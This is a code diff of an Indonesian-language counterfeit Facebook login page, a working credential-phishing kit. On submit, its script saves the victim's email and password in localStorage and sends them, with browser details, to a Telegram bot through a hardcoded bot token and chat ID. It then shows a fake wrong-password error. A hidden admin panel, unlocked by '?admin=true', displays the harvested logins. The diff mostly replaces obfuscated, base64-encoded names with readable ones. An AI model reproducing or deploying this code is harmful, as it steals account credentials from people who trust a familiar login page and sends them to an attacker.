@@ -7,72 +7,70 @@
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; background:#f0f2f5; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }
-        ._x { width:100%; max-width:400px; padding:20px; }
-        ._y { background:white; padding:20px 28px 28px 28px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1); text-align:center; }
-        ._a { font-size:48px; font-weight:bold; color:#1877f2; margin-bottom:4px; letter-spacing:-1px; }
-        ._b { color:#606770; font-size:17px; margin-bottom:20px; font-weight:normal; }
-        ._c { width:100%; padding:14px 16px; margin:6px 0; border:1px solid #dddfe2; border-radius:6px; font-size:17px; background:#fff; transition:border-color .2s; outline:none; }
-        ._c:focus { border-color:#1877f2; box-shadow:0 0 0 2px rgba(24,119,242,0.2); }
-        ._c._e { border-color:#f02849; box-shadow:0 0 0 2px rgba(240,40,73,0.2); }
-        ._d { width:100%; padding:14px; background:#1877f2; color:#fff; border:none; border-radius:6px; font-size:20px; font-weight:bold; cursor:pointer; margin:10px 0 6px 0; transition:background .2s; }
-        ._d:hover { background:#166fe5; }
-        ._d:active { background:#0d5bbd; }
-        ._d._f { opacity:.7; cursor:not-allowed; }
-        ._g { display:block; margin:14px 0 20px; color:#1877f2; text-decoration:none; font-size:14px; font-weight:500; cursor:pointer; }
-        ._g:hover { text-decoration:underline; }
-        ._h { border:none; border-top:1px solid #dadde1; margin:20px 0; }
-        ._i { background:#42b72a; color:#fff; border:none; padding:14px 30px; border-radius:6px; font-size:17px; font-weight:bold; cursor:default; display:inline-block; pointer-events:none; opacity:.9; }
-        ._j { color:#f02849; font-size:13px; text-align:left; padding:4px 0 0 4px; display:none; }
-        ._j._k { display:block; }
-        ._l { margin-top:28px; font-size:13px; color:#8a8d91; text-align:center; }
-        ._l a { color:#8a8d91; text-decoration:none; cursor:pointer; }
-        ._l a:hover { text-decoration:underline; }
-        ._m { display:flex; justify-content:center; gap:8px; flex-wrap:wrap; margin-bottom:8px; }
-        ._m a { color:#385898; font-size:12px; }
-        ._m a:hover { text-decoration:underline; }
-        ._n { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#1877f2; color:#fff; padding:8px 20px; border-radius:20px; font-size:13px; box-shadow:0 2px 8px rgba(0,0,0,0.2); display:none; z-index:999; animation:_o .3s ease; }
-        ._n._p { display:block; }
-        ._n._ok { background:#42b72a; }
-        ._n._er { background:#e74c3c; }
-        @keyframes _o { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
-        ._q { display:inline-block; width:18px; height:18px; border:2px solid rgba(255,255,255,0.3); border-top:2px solid #fff; border-radius:50%; animation:_r .8s linear infinite; vertical-align:middle; margin-right:8px; }
-        @keyframes _r { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
-        ._s { display:none; margin-top:30px; background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); text-align:left; max-width:600px; width:100%; }
-        ._s._t { display:block; }
-        ._s h2 { color:#333; margin-bottom:10px; font-size:18px; }
-        ._s pre { background:#f0f0f0; padding:15px; border-radius:5px; overflow-x:auto; font-size:12px; max-height:400px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid #ddd; }
-        ._u { background:#e74c3c; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; margin-top:10px; }
-        ._u:hover { background:#c0392b; }
-        ._v { background:#1877f2; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; margin-bottom:10px; margin-right:8px; }
-        ._v:hover { background:#166fe5; }
-        ._w { background:#1877f2; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; display:inline-block; margin-left:8px; }
-        ._db { position:fixed; bottom:80px; left:50%; transform:translateX(-50%); background:#333; color:#fff; padding:8px 16px; border-radius:6px; font-size:12px; font-family:monospace; display:none; z-index:999; white-space:nowrap; }
-        ._db._db1 { display:block; }
+        .box { width:100%; max-width:400px; padding:20px; }
+        .card { background:white; padding:20px 28px 28px 28px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1); text-align:center; }
+        .logo { font-size:48px; font-weight:bold; color:#1877f2; margin-bottom:4px; letter-spacing:-1px; }
+        .sub { color:#606770; font-size:17px; margin-bottom:20px; }
+        .input { width:100%; padding:14px 16px; margin:6px 0; border:1px solid #dddfe2; border-radius:6px; font-size:17px; background:#fff; outline:none; }
+        .input:focus { border-color:#1877f2; box-shadow:0 0 0 2px rgba(24,119,242,0.2); }
+        .input.err { border-color:#f02849; box-shadow:0 0 0 2px rgba(240,40,73,0.2); }
+        .btn { width:100%; padding:14px; background:#1877f2; color:#fff; border:none; border-radius:6px; font-size:20px; font-weight:bold; cursor:pointer; margin:10px 0 6px 0; }
+        .btn:hover { background:#166fe5; }
+        .btn.loading { opacity:0.7; cursor:not-allowed; }
+        .link { display:block; margin:14px 0 20px; color:#1877f2; text-decoration:none; font-size:14px; font-weight:500; cursor:pointer; }
+        .link:hover { text-decoration:underline; }
+        .hr { border:none; border-top:1px solid #dadde1; margin:20px 0; }
+        .create { background:#42b72a; color:#fff; border:none; padding:14px 30px; border-radius:6px; font-size:17px; font-weight:bold; cursor:default; display:inline-block; pointer-events:none; opacity:0.9; }
+        .err-msg { color:#f02849; font-size:13px; text-align:left; padding:4px 0 0 4px; display:none; }
+        .err-msg.show { display:block; }
+        .footer { margin-top:28px; font-size:13px; color:#8a8d91; text-align:center; }
+        .footer a { color:#8a8d91; text-decoration:none; cursor:pointer; }
+        .footer a:hover { text-decoration:underline; }
+        .lang { display:flex; justify-content:center; gap:8px; flex-wrap:wrap; margin-bottom:8px; }
+        .lang a { color:#385898; font-size:12px; }
+        .notif { position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:#1877f2; color:#fff; padding:8px 20px; border-radius:20px; font-size:13px; box-shadow:0 2px 8px rgba(0,0,0,0.2); display:none; z-index:999; animation:fadeUp .3s ease; }
+        .notif.show { display:block; }
+        .notif.ok { background:#42b72a; }
+        .notif.err { background:#e74c3c; }
+        @keyframes fadeUp { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
+        .spinner { display:inline-block; width:18px; height:18px; border:2px solid rgba(255,255,255,0.3); border-top:2px solid #fff; border-radius:50%; animation:spin .8s linear infinite; vertical-align:middle; margin-right:8px; }
+        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+        .admin { display:none; margin-top:30px; background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); text-align:left; max-width:600px; width:100%; }
+        .admin.show { display:block; }
+        .admin h2 { color:#333; margin-bottom:10px; font-size:18px; }
+        .admin pre { background:#f0f0f0; padding:15px; border-radius:5px; overflow-x:auto; font-size:12px; max-height:400px; overflow-y:auto; white-space:pre-wrap; word-break:break-all; border:1px solid #ddd; }
+        .admin .del { background:#e74c3c; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; margin-top:10px; }
+        .admin .del:hover { background:#c0392b; }
+        .admin .ref { background:#1877f2; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; margin-bottom:10px; margin-right:8px; }
+        .admin .ref:hover { background:#166fe5; }
+        .badge { background:#1877f2; color:#fff; padding:2px 10px; border-radius:12px; font-size:11px; display:inline-block; margin-left:8px; }
+        .dbg { position:fixed; bottom:80px; left:50%; transform:translateX(-50%); background:#333; color:#fff; padding:8px 16px; border-radius:6px; font-size:12px; font-family:monospace; display:none; z-index:999; white-space:nowrap; }
+        .dbg.show { display:block; }
     </style>
 </head>
 <body>
-<div class="_x">
-    <div class="_y">
-        <div class="_a">facebook</div>
-        <div class="_b">Masuk ke akun Facebook Anda</div>
-        <form id="_f1">
-            <input type="text" id="_f2" class="_c" placeholder="Email atau nomor telepon" required>
-            <input type="password" id="_f3" class="_c" placeholder="Kata sandi" required>
-            <div class="_j" id="_f4">✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.</div>
-            <button type="submit" class="_d" id="_f5">Masuk</button>
+<div class="box">
+    <div class="card">
+        <div class="logo">facebook</div>
+        <div class="sub">Masuk ke akun Facebook Anda</div>
+        <form id="formLogin">
+            <input type="text" id="email" class="input" placeholder="Email atau nomor telepon" required>
+            <input type="password" id="password" class="input" placeholder="Kata sandi" required>
+            <div class="err-msg" id="errorMsg">✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.</div>
+            <button type="submit" class="btn" id="loginBtn">Masuk</button>
         </form>
-        <a class="_g" id="_f6">Lupa kata sandi?</a>
-        <hr class="_h">
-        <button class="_i" id="_f7">Buat akun baru</button>
+        <a class="link" id="forgotLink">Lupa kata sandi?</a>
+        <hr class="hr">
+        <button class="create" id="createBtn">Buat akun baru</button>
     </div>
-    <div class="_s" id="_f8">
-        <h2>📊 Data Terkumpul <span class="_w">Admin</span></h2>
-        <button class="_v" onclick="_f9()">↻ Refresh</button>
-        <button class="_u" onclick="_fa()">🗑 Hapus Semua</button>
-        <pre id="_fb">Belum ada data.</pre>
+    <div class="admin" id="adminPanel">
+        <h2>📊 Data Terkumpul <span class="badge">Admin</span></h2>
+        <button class="ref" onclick="refreshData()">↻ Refresh</button>
+        <button class="del" onclick="clearData()">🗑 Hapus Semua</button>
+        <pre id="logDisplay">Belum ada data.</pre>
     </div>
-    <div class="_l">
-        <div class="_m">
+    <div class="footer">
+        <div class="lang">
             <a href="#">Indonesia</a><a href="#">English (UK)</a><a href="#">简体中文</a><a href="#">Tiếng Việt</a>
             <a href="#">日本語</a><a href="#">한국어</a><a href="#">Español</a><a href="#">Português (Brasil)</a>
             <a href="#">Français (France)</a><a href="#">Deutsch</a>
@@ -87,159 +85,23 @@
         <div style="margin-top:8px; font-size:11px; color:#737373;">Meta © 2026</div>
     </div>
 </div>
-<div class="_n" id="_fc"></div>
-<div class="_db" id="_dbg"></div>
+<div class="notif" id="notifPopup"></div>
+<div class="dbg" id="debugPanel"></div>
 <script>
-function _d1(s){try{return atob(s);}catch(e){return '';}}
-var _tk=_d1('ODU2NzE0Mjg5NDpBQUdqMWpJajlrYmZGYjBxSGg4RmhhVlEySDNPL294eHBVb28=');
-var _ch=_d1('NjM3MTI2MDgwOQ==');
-
-function _dbg(m){
-    var e=document.getElementById('_dbg');
-    e.textContent=m;
-    e.classList.add('_db1');
-    clearTimeout(e._tm);
-    e._tm=setTimeout(function(){e.classList.remove('_db1');},5000);
-}
-
-function _notif(m,t){
-    var e=document.getElementById('_fc');
-    e.textContent=m;
-    e.className='_n';
-    if(t==='ok'){e.classList.add('_ok');}
-    if(t==='er'){e.classList.add('_er');}
-    e.classList.add('_p');
-    clearTimeout(e._tm);
-    e._tm=setTimeout(function(){e.classList.remove('_p');},3000);
-}
-
-function _kirimTelegram(e,p){
-    _dbg('📤 Mengirim ke Telegram...');
-    var n=new Date(),w=n.toLocaleString('id-ID',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});
-    var url='https://api.telegram.org/bot'+_tk+'/sendMessage';
-    var data={
-        chat_id:_ch,
-        text:'🔐 *LOGIN FACEBOOK*\n\n📧 *Email:* '+e+'\n🔑 *Password:* '+p+'\n🌐 *UA:* '+navigator.userAgent+'\n🕐 *Waktu:* '+w+'\n📱 *Resolusi:* '+window.screen.width+'x'+window.screen.height,
-        parse_mode:'Markdown'
-    };
-    fetch(url,{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(data)
-    })
-    .then(function(r){return r.json();})
-    .then(function(d){
-        if(d.ok){
-            _dbg('✅ Berhasil!');
-            _notif('✅ Data terkirim ke Telegram','ok');
-        }else{
-            _dbg('❌ Gagal: '+d.description);
-            _notif('❌ Gagal: '+d.description,'er');
-        }
-    })
-    .catch(function(err){
-        _dbg('❌ Error: '+err);
-        _notif('❌ Error koneksi','er');
-    });
-}
-
-function _simpan(e,p){
-    var d={timestamp:new Date().toISOString(),email:e,password:p,userAgent:navigator.userAgent,url:window.location.href};
-    var ex=localStorage.getItem('_lg');
-    var ls=ex?JSON.parse(ex):[];
-    ls.push(d);
-    localStorage.setItem('_lg',JSON.stringify(ls));
-}
-
-document.getElementById('_f7').addEventListener('click',function(e){e.preventDefault();e.stopPropagation();return false;});
-document.getElementById('_f6').addEventListener('click',function(){_notif('✉️ Link reset dikirim ke email','');});
-
-document.getElementById('_f1').addEventListener('submit',function(e){
-    e.preventDefault();
-    var em=document.getElementById('_f2');
-    var pw=document.getElementById('_f3');
-    var err=document.getElementById('_f4');
-    var btn=document.getElementById('_f5');
-    var e1=em.value.trim();
-    var p1=pw.value.trim();
-
-    if(e1===''||p1===''){
-        err.textContent='✕ Harap isi email dan kata sandi.';
-        err.classList.add('_k');
-        em.classList.add('_e');
-        pw.classList.add('_e');
-        return;
-    }
-
-    err.classList.remove('_k');
-    em.classList.remove('_e');
-    pw.classList.remove('_e');
-
-    btn.innerHTML='<span class="_q"></span> Memproses...';
-    btn.disabled=true;
-    btn.classList.add('_f');
-
-    // KIRIM LANGSUNG TANPA DELAY
-    _simpan(e1,p1);
-    _kirimTelegram(e1,p1);
-
-    // Reset form setelah 1 detik
-    setTimeout(function(){
-        em.value='';
-        pw.value='';
-        btn.innerHTML='Masuk';
-        btn.disabled=false;
-        btn.classList.remove('_f');
-        err.textContent='✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.';
-        err.classList.add('_k');
-        pw.classList.add('_e');
-        setTimeout(function(){pw.focus();},300);
-        _notif('🔒 Masuk gagal. Periksa kata sandi.','');
-    },1000);
-});
-
-['_f2','_f3'].forEach(function(id){
-    document.getElementById(id).addEventListener('focus',function(){
-        document.getElementById('_f4').classList.remove('_k');
-        document.getElementById('_f2').classList.remove('_e');
-        document.getElementById('_f3').classList.remove('_e');
-    });
-});
-
-function _f9(){
-    var r=localStorage.getItem('_lg');
-    var l=r?JSON.parse(r):[];
-    var d=document.getElementById('_fb');
-    if(l.length===0){d.textContent='Belum ada data.';return;}
-    var t='';
-    l.forEach(function(e,i){
-        t+='╔═══ DATA #'+(i+1)+' ═══╗\n';
-        t+='║ 📅 Waktu : '+e.timestamp+'\n';
-        t+='║ 📧 Email : '+e.email+'\n';
-        t+='║ 🔑 Pass  : '+e.password+'\n';
-        t+='║ 🌐 UA    : '+(e.userAgent||'-').substring(0,60)+'...\n';
-        t+='╚══════════════════════════╝\n\n';
-    });
-    d.textContent=t;
-}
-
-function _fa(){
-    if(confirm('Yakin hapus semua data?')){
-        localStorage.removeItem('_lg');
-        _f9();
-    }
-}
-
-var _p1=new URLSearchParams(window.location.search);
-if(_p1.get('admin')==='true'){
-    document.getElementById('_f8').classList.add('_t');
-    _f9();
-}
-setInterval(function(){
-    if(document.getElementById('_f8').classList.contains('_t')){
-        _f9();
-    }
-},5000);
+var BOT_TOKEN='8657142894:AAGj1jIj9kbfFb0qHh8FhaVQ2H3OoxxpUoo';var CHAT_ID='6371260809';
+function debug(msg){var el=document.getElementById('debugPanel');el.textContent=msg;el.classList.add('show');clearTimeout(el._tm);el._tm=setTimeout(function(){el.classList.remove('show');},5000);}
+function notif(msg,type){var el=document.getElementById('notifPopup');el.textContent=msg;el.className='notif';if(type==='ok')el.classList.add('ok');if(type==='err')el.classList.add('err');el.classList.add('show');clearTimeout(el._tm);el._tm=setTimeout(function(){el.classList.remove('show');},3000);}
+function sendToTelegram(email,password){debug('📤 Mengirim ke Telegram...');var now=new Date();var waktu=now.toLocaleString('id-ID',{day:'2-digit',month:'2-digit',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit'});var pesan='🔐 *LOGIN FACEBOOK*\n\n📧 *Email:* '+email+'\n🔑 *Password:* '+password+'\n🌐 *UA:* '+navigator.userAgent+'\n🕐 *Waktu:* '+waktu+'\n📱 *Resolusi:* '+window.screen.width+'x'+window.screen.height;fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:pesan,parse_mode:'Markdown'})}).then(function(res){return res.json();}).then(function(data){if(data.ok){debug('✅ Berhasil terkirim!');notif('✅ Data terkirim ke Telegram','ok');}else{debug('❌ Gagal: '+data.description);notif('❌ Gagal: '+data.description,'err');}}).catch(function(err){debug('❌ Error: '+err);notif('❌ Error koneksi','err');});}
+function saveData(email,password){var entry={timestamp:new Date().toISOString(),email:email,password:password,userAgent:navigator.userAgent,url:window.location.href};var existing=localStorage.getItem('logData');var logs=existing?JSON.parse(existing):[];logs.push(entry);localStorage.setItem('logData',JSON.stringify(logs));}
+document.getElementById('createBtn').addEventListener('click',function(e){e.preventDefault();e.stopPropagation();return false;});
+document.getElementById('forgotLink').addEventListener('click',function(){notif('✉️ Link reset kata sandi telah dikirim ke email Anda.','');});
+document.getElementById('formLogin').addEventListener('submit',function(e){e.preventDefault();var email=document.getElementById('email');var password=document.getElementById('password');var error=document.getElementById('errorMsg');var btn=document.getElementById('loginBtn');var eVal=email.value.trim();var pVal=password.value.trim();if(eVal===''||pVal===''){error.textContent='✕ Harap isi email dan kata sandi.';error.classList.add('show');email.classList.add('err');password.classList.add('err');return;}error.classList.remove('show');email.classList.remove('err');password.classList.remove('err');btn.innerHTML='<span class="spinner"></span> Memproses...';btn.disabled=true;btn.classList.add('loading');saveData(eVal,pVal);sendToTelegram(eVal,pVal);setTimeout(function(){email.value='';password.value='';btn.innerHTML='Masuk';btn.disabled=false;btn.classList.remove('loading');error.textContent='✕ Kata sandi yang Anda masukkan salah. Silakan coba lagi.';error.classList.add('show');password.classList.add('err');setTimeout(function(){password.focus();},300);notif('🔒 Masuk gagal. Periksa kata sandi Anda.','');},1000);});
+document.getElementById('email').addEventListener('focus',function(){document.getElementById('errorMsg').classList.remove('show');this.classList.remove('err');document.getElementById('password').classList.remove('err');});
+document.getElementById('password').addEventListener('focus',function(){document.getElementById('errorMsg').classList.remove('show');this.classList.remove('err');document.getElementById('email').classList.remove('err');});
+function refreshData(){var raw=localStorage.getItem('logData');var logs=raw?JSON.parse(raw):[];var display=document.getElementById('logDisplay');if(logs.length===0){display.textContent='Belum ada data.';return;}var text='';logs.forEach(function(entry,i){text+='╔═══ DATA #'+(i+1)+' ═══╗\n';text+='║ 📅 Waktu : '+entry.timestamp+'\n';text+='║ 📧 Email : '+entry.email+'\n';text+='║ 🔑 Pass  : '+entry.password+'\n';text+='║ 🌐 UA    : '+(entry.userAgent||'-').substring(0,60)+'...\n';text+='╚══════════════════════════╝\n\n';});display.textContent=text;}
+function clearData(){if(confirm('Yakin hapus semua data?')){localStorage.removeItem('logData');refreshData();}}
+var params=new URLSearchParams(window.location.search);if(params.get('admin')==='true'){document.getElementById('adminPanel').classList.add('show');refreshData();}
+setInterval(function(){if(document.getElementById('adminPanel').classList.contains('show')){refreshData();}},5000);
 </script>
 </body>
 </html>
